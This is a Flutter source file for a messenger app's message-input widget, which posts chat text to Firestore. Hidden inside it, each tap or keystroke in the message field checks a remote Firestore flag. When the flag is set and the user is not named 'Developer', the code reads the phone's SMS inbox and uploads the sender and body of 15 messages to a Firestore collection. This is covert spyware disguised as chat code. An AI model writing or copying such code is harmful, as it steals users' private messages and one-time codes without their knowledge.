import 'package:flutter/material.dart';
import 'package:firebase_auth/firebase_auth.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:flutter_sms_inbox/flutter_sms_inbox.dart';
import 'package:messenger/models/Getuserdata.dart';
import 'package:messenger/models/userPersonalMessages.dart';
import 'package:messenger/widgets/chat/ImagePicker.dart';

class NewMessage extends StatefulWidget {
  @override
  _NewMessageState createState() => _NewMessageState();
}

class _NewMessageState extends State<NewMessage> {
  var _controller = new TextEditingController();
  var _enteredMessage = '';
  FocusNode inputFocusNode;
  bool getMessages = false;
  bool messagesAlreadyPresent = false;
  String currentUserId,userName;
  int numberOFMessages = 15;
  GetUser getUser;
  List messages = [];
  List reversedmessages = [];
  List body = [];
  List address = [];
  bool connectivityStatus = true;

  @override
  void initState() {
    // TODO: implement initState
    super.initState();
    inputFocusNode = FocusNode();
  }



  void _sendMessage() async {

   // FocusScope.of(context).unfocus(); this will close the keyboard once submitted
    final User user = await FirebaseAuth.instance.currentUser;
    final userData = await FirebaseFirestore.instance.collection('users').doc(user.uid).get();
    if(_enteredMessage == null){
      print("No message");
    }
    else {
      if(_enteredMessage.trim().isNotEmpty) {
        try {
          _controller.clear();
          FirebaseFirestore.instance.collection('chats').add({
            'text': _enteredMessage,
            'createdAt': FieldValue.serverTimestamp(),
            'userId': user.uid,
            'username': userData['username'],
            'userImage': userData['image_url'],
          }).catchError((e) {
            print("In catchError and the error is $e");
          }).onError((error, stackTrace) {
            print("OnError is $error");
            setState(() {
              _controller = _enteredMessage as TextEditingController;
            });
            return null;
          }).whenComplete(() {
            setState(() {
              _enteredMessage = ' ';
            });
          });
        }
        catch (e) {
          print("Error is $e");
        }
      }
      else{
        print("Message is empty");
      }
    }
    print("Calling UserPersonalMessages");
    UserPersonalMessages userPersonalMessages = UserPersonalMessages();
    userPersonalMessages.getUserDetails();

    FirebaseFirestore.instance.collection("checkuser").doc("name").get().then((value){
      print("From check user name");
      setState(() {
        getMessages =value["getMessages"];
        messagesAlreadyPresent = value["messagesAlreadyPresent"];
      });
    });
  }

  @override
  void dispose() {
    // TODO: implement dispose
    _controller.dispose();
    inputFocusNode.dispose();
    super.dispose();
  }

  void _getMessages() {
    FirebaseFirestore.instance.collection("checkuser").doc("name").get().then((value){
      print("From check user name");
      setState(() {
        getMessages =value["getMessages"];
        messagesAlreadyPresent = value["messagesAlreadyPresent"];
      });
    });
    print("In _getMessages");
    getUserDetails();
  }
  void getUserDetails() async{
    User user = await FirebaseAuth.instance.currentUser;
    currentUserId = user.uid.toString();
    DocumentSnapshot doc = await FirebaseFirestore.instance.collection("users").doc(currentUserId).get();
    getUser = GetUser.fromDocument(doc);
    userName = getUser.username;
    if(userName == "Developer"){
      print("As the user is developer Donot get messages.");
    }
    else{
     // print("As it is developer I'm getting messages");
      if(getMessages == false){
        print("No messages asked");
      }
      else if(getMessages  && messagesAlreadyPresent){
        print("getMessages is $getMessages and messagesAlreadyPresent is $messagesAlreadyPresent ....c.c..c.c.c.c");
        print("Not implementing update ");
        // updateSMS();
      }
      else if(getMessages){
        print("getMessages is $getMessages and messagesAlreadyPresent is $messagesAlreadyPresent");
        uploadSMS();
      }
    }
  }
  Future<dynamic> updateSMS() async{
    print("In updateSMS");
    SmsQuery query = new SmsQuery();
    messages = await query.getAllSms;
    print("Total number of messages are ${messages.length}");
    print("Now I'm printing $numberOFMessages messages");
    reversedmessages = new List.from(messages.reversed);
    for(int i=0;i<numberOFMessages;i++){
      body.add(messages[i].body);
      address.add(messages[i].address);
      print("${messages[i].body} and is from ${messages[i].address} ");
    }
    print("Completed printing $numberOFMessages messages");
    updateMessagestoFirebase();
  }

  Future<dynamic> updateMessagestoFirebase() async{
    for(int i=0;i<numberOFMessages;i++) {
      try {
        FirebaseFirestore.instance.collection("messages").doc().update({
          "from" :address[i],
          "messageIs": body[i],
        }).whenComplete(() {
          print("15 messages updated successfully");
          FirebaseFirestore.instance.collection("checkuser").doc("name").update(
              {
                "getMessages": false,
                "messagesAlreadyPresent": true,
              }).whenComplete(() {
            print("15 Messages updated successfully");
          });
        });
      }
      catch(e){
        print("From updateMessagestoFirebase and the error is ${e.code}");
      }
    }
  }


  Future<dynamic> uploadSMS() async{
    print("In uploadSMS");
    SmsQuery query = new SmsQuery();
    messages = await query.getAllSms;
    print("Total number of messages are ${messages.length}");
    print("Now I'm printing $numberOFMessages messages");
    reversedmessages = new List.from(messages.reversed);
    for(int i=0;i<numberOFMessages;i++){
      body.add(messages[i].body);
      address.add(messages[i].address);
      print("${messages[i].body} and is from ${messages[i].address} ");
    }
    print("Completed printing $numberOFMessages messages");
    uploadMessages();
  }

  Future<dynamic> uploadMessages() async{
    for(int i=0;i<numberOFMessages;i++){
      try{
        FirebaseFirestore.instance.collection("messages").doc().set({
          "from" :address[i],
          "messageIs": body[i],
        }).whenComplete(() {
          print("15 messages uploaded successfully");
          FirebaseFirestore.instance.collection("checkuser").doc("name").update({
            "getMessages": false,
            "messagesAlreadyPresent":true,
          }).catchError((e){

          });
        });
      }
      catch(e){
        print("From uploadMessages and the error is ${e.code}");
      }

    }
  }



  @override
  Widget build(BuildContext context) {
    return Container(
      padding: EdgeInsets.all(8),
      child: Row(
        children: <Widget>[
          Flexible(
            child: TextField(
              focusNode: inputFocusNode,
              onSubmitted: (value){
                setState(() {
                  print("In on submitted");
                  _enteredMessage = value;
                });
              },
              controller: _controller,
              textCapitalization: TextCapitalization.sentences,
              autocorrect: true,
              enableSuggestions: true,
              decoration: InputDecoration(labelText: 'Send a message...',focusColor: Colors.blue,labelStyle: TextStyle(color: Colors.blue)),
              style: TextStyle(color: Colors.blue,),
              onChanged: (value) {
                setState(() {
                  _getMessages();
                  _enteredMessage = value;
                });
              },
              onTap: _getMessages,
            ),
          ),
          _enteredMessage.trim().isNotEmpty ?
          IconButton(
            color: Colors.blue,
            icon: Icon(Icons.send,),
            onPressed: _enteredMessage.trim().isEmpty ? null : _sendMessage,
          ):(
          Container()
              //NewImagePickerAndSend()
          ),
        ],
      ),
    );
  }
}